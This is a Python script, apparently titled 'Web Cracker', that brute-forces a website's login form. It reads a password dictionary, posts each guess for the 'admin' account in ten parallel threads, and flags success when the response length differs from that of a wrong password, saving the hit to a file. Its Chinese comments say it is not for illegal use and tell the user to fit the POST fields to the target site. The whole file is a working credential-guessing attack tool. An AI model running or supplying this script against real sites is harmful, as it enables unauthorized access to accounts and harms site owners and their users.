#!/usr/bin/env python
# coding=utf-8
'''
   请勿用于非法用途！
   命令行运行，加上的参数为密码字典，字典请自行网上查找
   使用前请自行更改POST数据
   脚本已测试通过 支持python3
   By LiT0
'''

import requests
import sys
from concurrent.futures import ThreadPoolExecutor
import os


def DelDict(Dict):
    #处理字典转化为Post数据,！注意！！请根据post返回的数据自行定义！
    PostDict = {
        '__VIEWSTATE':'%2FwEPDwULLTEzMzEwNTMxMDNkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQZpbG9naW4FBmlyZXNldA%3D%3D',
        'txtUserId':'admin',
        'txtPwd':Dict,
        'ilogin.x':'43',
        'ilogin.y':'2'
    }
    return PostDict


def LoginAction(PostDict,Dict):
    #尝试登录
    try:
        respon = requests.post(url,data=PostDict,headers=header)
        print(Dict,end=' ')
        headlength = respon.headers['Content-Length']
        print(headlength)
        #返回数据长度不等于错误密码数据长度则保存密码
        if Length != headlength:
            with open(os.path.abspath('.')+'/mima.txt','a') as file:
                file.write(str(PostDict))
                print("[Note:]Get PassWord: ",Dict)
            os._exit(0)
    except Exception as e:
        print(e)
        LoginAction(PostDict,Dict)


def GetLength(Dict):
    #获取错误密码返回的length
    PostDict = DelDict(Dict)
    try:
        respon = requests.post(url,data=PostDict,headers=header)
        Length = respon.headers['Content-Length']
    except Exception as e:
        print(e)
        os._exit(0)
    return Length


def LoginTest():
    #爆破
    with open(sys.argv[1],'r') as file:
        with ThreadPoolExecutor(10) as Executor:
            for line in file:
                Dict = line.strip('\n')
                PostDict = DelDict(Dict)
                try:
                    Executor.submit(LoginAction,PostDict,Dict)
                except Exception as e:
                    print(e)
                    pass
    print('[Note:]:AllDone')


def WelcomeNdumpdata():
    print('[Note:]**************WelCome To Web Cracker****************')
    print('[Note:]                    By  LiT0')
    print('[Note:] Please edit PostDict for website before working ')
    global url
    u = input('[Note:]Boom! Url: ')
    url = 'http://'+str(u)
    global header
    header = {
        'Cache-Control':'max-age=0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent':'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'Content-Type':'application/x-www-form-urlencoded',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.8'
    }


if __name__ == '__main__':

    WelcomeNdumpdata()

    global Length
    Length = GetLength('bukenengh')

    LoginTest()
